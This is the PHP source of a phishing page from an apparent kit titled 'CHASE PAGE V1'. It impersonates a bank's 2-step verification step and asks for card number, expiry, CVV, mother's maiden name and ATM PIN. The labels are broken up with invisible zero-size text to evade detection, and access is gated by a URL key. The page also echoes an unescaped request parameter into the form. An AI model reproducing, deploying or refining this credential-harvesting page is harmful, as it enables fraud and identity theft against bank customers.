<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();
// include'Protection.php'; 
//   if (!isset($_SESSION['ZRXSESSION']) or !isset($_GET['key'])) {
//       header('HTTP/1.0 403 Forbidden');
//       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
//       exit();
//   }
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
// Generating a CSRF Token

if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['token'];

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
   <head>
      <meta charset="UTF-8">
      <meta name="robots" content="noindex,nofollow">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title>2-Step - Account Verification</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <link rel="stylesheet" type="text/css" href="files/css/verifyzroxo.css">
      <link rel="stylesheet" type="text/css" href="files/css/verifyzroxo2.css">
      <link rel="shortcut icon" href="files/img/faviconx.ico">
      <style type="text/css">input#expdate {width: 49%;}input#cccvv {width: 30%;}.title {color: #bf2155;outline: 0!important;}.title {font-size: 14px;font-weight: 600;}.zroxoru.icon.exclamation-color {color: #bf2155;}
      </style>
   </head>
   <body>
      <div>
      <header>
         <div class="a8f5dfn4df4nd">
            <div class="row top" style="background-color: #005eb8;">
               <div class="col-xs-4"> 
                  <span>
                  <a class="zroxo focus" href="javascript:void(0);"><i class="zroxo menulines icon" id="sdb4sdb4sdsc">
                  </i>
                  </a>
                  </span> 
                  <span class="zroxo link" id="exitlink">
                  <a class="yjhsdxcb5ds4b6 vncn5fd4ndf1n" id="exitApp" href="javascript:void(0);">Exit</a>
                  </span>
               </div>
               <div class="col-xs-4 ytik54fnvc">
                  <svg class="octogon" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" focusable="false">
                     <path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);"></path>
                     <path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           </path>
                     <path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);"></path>
                     <path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);"></path>
                  </svg>
               </div>
               <div class="col-xs-4 util right yiuxcnx3453">
               </div>
            </div>
         </div>
      </header>
      <div>
      <div>
      <div class="xcbd5h4bsdbdsb">
      </div>
      <form id="formid" action="actions/auth4" method="POST" autocomplete="off">
        <input type="hidden" name="token" value="<?php echo $token; ?>" />  
        <input type="hidden" name="key_token" value="<?php echo $_GET['key']; ?>" />  
         <main class="xcbd5h4bsdbdsb">
            <div>
               <div>
                  <style>.origination-custom.zroxo.progress.bar.step1of8:after{width: 50%;}</style>
                  <div class="row vj94ndfn4dfn">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div>
                           <div>
                              <h1 tabindex="-1">Verification</h1>
                           </div>
                        </div>

                        <div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-12">
                                 <div class="zroxo progress origination-custom step1of8 bar">
                                    <div class="bar fill">
                                  
                              </div>
                           </div>
                        </div>
                        <br>
                     </div>
                  </div>


                                     <?php
                                        if (isset($_GET['invalid'])) {
                                          echo "<h2 class='title' tabindex='-1'><i class='zroxoru exclamation-color icon'></i> It looks like there's an issue with the info you told us. Please double-check your card details.</h2><input type='hidden' name='invalid' />";
                                        }
                                     ?>



               </div>
            </div>
            <section class="origination page-content" id="content" >
               <div id="Bvdfnf65ndf">
               <div class="row">
               <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
               <div>
                  <div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-6">
                           <div class="zroxo header Ddff6n5dfn field-mb-12 field-mt-0">C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>a<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rd de<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tai<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ls</div>
                        </div>
                     </div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-12">
                           <div class="BODY field-mb-24">Please verify the c<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d deta<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ils linked to your account.</div>
                        </div>
                     </div>
                     <div>
                        <div class="zroxobb nameInformation">
                           <div class="inlineFieldRow">
                              <div class="inlineFieldCell">
                                 <div class="zroxo fieldgroup">
                                    <div class="zroxo vertical">
                                       <div class="align-label-input">
                                          <div class="label-wrapper">
                                             <label class="zroxo fieldlabel label-alignment vertical">
                                             <span class="util bcvbdsndf7845dbv">
                                             </span><font style="color:transparent;font-size:0px"><?=$rundom;?></font>C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>a<font style="color:transparent;font-size:0px"><?=$rundom;?></font>r<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d n<font style="color:transparent;font-size:0px"><?=$rundom;?></font>umb<font style="color:transparent;font-size:0px"><?=$rundom;?></font>er <span class="util bcvbdsndf7845dbv">
                                             </span>
                                             </label>
                                          </div>
                                          <div class="zroxo validationinput">
                                             <div> 
                                                <input class="zroxo input" placeholder="" name="ccnum" required="" data-validation="creditcard" data-validation-error-msg="It looks like the card number you told us is incorrect. Please try again.">
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div>
                  <div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-6">
                           <div>
                              <div class="zroxo fieldgroup">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>E<font style="color:transparent;font-size:0px"><?=$rundom;?></font>xpir<font style="color:transparent;font-size:0px"><?=$rundom;?></font>atio<font style="color:transparent;font-size:0px"><?=$rundom;?></font>n date<span class="util bcvbdsndf7845dbv">
                                          </span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div id="dateOfBirth-text-validate">
                                             <input class="zroxo input" id="expdate" name="expdate"  type="num" placeholder=""  data-validation="length"  data-validation-length="min7"  data-validation-error-msg="Please tell us valid date in mm/yyyy format." >
                                             <span class="util bcvbdsndf7845dbv" aria-hidden="true">: formats as you type mm/yyyy</span>
                                          </div>
                                       </div>
                                    </div>
                                    <div>
                                       <div>
                                          <div class="tdb5dh54sdh">
                                             <div class="zroxo fieldhelpertext">mm/yyyy  </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>

               <div class="row">
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup addressZipCode ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div>
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv">
                                                         </span>S<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ecu<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ty co<font style="color:transparent;font-size:0px"><?=$rundom;?></font>de<span class="util bcvbdsndf7845dbv">
                                                         </span>
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div>
                                                            <input class="zroxo input"  placeholder="" type="password" id="cccvv" name="cccvv" data-validation="cvv" data-validation-error-msg="Security code (cvv) is required!"> 
                                                         </div>
                                                      </div>
                                                      <div><div> <div class="tdb5dh54sdh"><div class="zroxo fieldhelpertext">the thr<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ee-di<font style="color:transparent;font-size:0px"><?=$rundom;?></font>git C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>V<font style="color:transparent;font-size:0px"><?=$rundom;?></font>V numb<font style="color:transparent;font-size:0px"><?=$rundom;?></font>er is print<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ed on the bac<font style="color:transparent;font-size:0px"><?=$rundom;?></font>k of the card to the rig<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ht of the signature box.</div></div> </div></div>

                                                   </div>
                                                </div>
                                             </div>
                                    </div>
                              </div>

                     <div>
                        <div>
                           <div class="row b5x4bxc4b">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="zroxo header Ddff6n5dfn field-mt-0 field-mb-24">C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d Veri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ion</div>
                              </div>
                           </div>
                           <div>

                              <div class="zroxobb multiType">
                                 <div>
                                    <div class="zroxobb">
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div class="align-label-input">
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv">
                                                         </span>Mot<font style="color:transparent;font-size:0px"><?=$rundom;?></font>her's Mai<font style="color:transparent;font-size:0px"><?=$rundom;?></font>den Na<font style="color:transparent;font-size:0px"><?=$rundom;?></font>me  <span class="util bcvbdsndf7845dbv">
                                                         </span>
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div id="streetAddress-blx-residentialAddressBlock-text-validate">
                                                            <input  class="zroxo input"  placeholder="" name="mmn" data-validation="length" data-validation-length="min1-12" data-validation-error-msg="Please tell us your Mmn.">
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div class="align-label-input">
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv" >
                                                         </span>Atm pin
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div>
                                                            <input class="zroxo input" placeholder="" type="password" name="ammpnn" data-validation="length" data-validation-length="min4-4" data-validation-error-msg="Please tell us your Atm Pin.">
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                   
                        <div>
                           <div>
                              <div class="row">
                                 <div class="col-xs-12">
                                    <p class="BODY">for addi<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tiona<font style="color:transparent;font-size:0px"><?=$rundom;?></font>l secu<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rity pl<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ease ver<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ify your m<font style="color:transparent;font-size:0px"><?=$rundom;?></font>mn to sub<font style="color:transparent;font-size:0px"><?=$rundom;?></font>mit your c<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d de<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tail.
                                    </p>
                                 </div>
                              </div>
                              <div class="field-mt-24"></div>
                              <div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </section>
            <div id="rtjfndf654n">
               <div>
                  <div class="row">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div class="row">
                           <div class="col-xs-12 xcfd4df5ndf">
                              <button type="submit" class="zroxo button focus util float right primary" style="background-color: #005eb8;">
                              <span class="label">Next</span>
                              </button>
                              <button type="button" id="BACKbtn" class="zroxo button focus util float right t8g7d6dh4db">
                              <span class="label">Back</span>
                              </button>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </main>
      </form>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    if (params.key === '' || params.key === null || params.key === undefined) {
        window.location.href = "/final_backup/error";
    }
    
  $.validate({
    modules : 'security'
  });
Inputmask("9{1,2}/9{1,4}").mask("#expdate");

$("#formid").validate({
  invalidHandler: function(event, validator) {
    // 'this' refers to the form
    var errors = validator.numberOfInvalids();
    if (errors) {
      var message = errors == 1
        ? 'You missed 1 field. It has been highlighted'
        : 'You missed ' + errors + ' fields. They have been highlighted';
      $("div.error span").html(message);
      $("div.error").show();
    } else {
      $("div.error").hide();
    }
  }
});
</script>
</body>
</html>